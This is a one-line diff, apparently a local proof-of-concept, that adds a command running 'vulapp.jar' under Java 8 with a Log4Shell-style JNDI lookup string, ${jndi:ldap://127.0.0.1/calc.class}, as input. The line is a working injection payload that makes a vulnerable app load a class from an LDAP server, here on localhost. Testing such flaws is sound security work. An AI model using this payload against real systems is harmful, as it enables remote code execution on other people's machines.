@@ -1,0 +1,1 @@
+D:\Java\jdk1.8.0_121\bin\java -jar vulapp.jar ${jndi:ldap://127.0.0.1/calc.class}
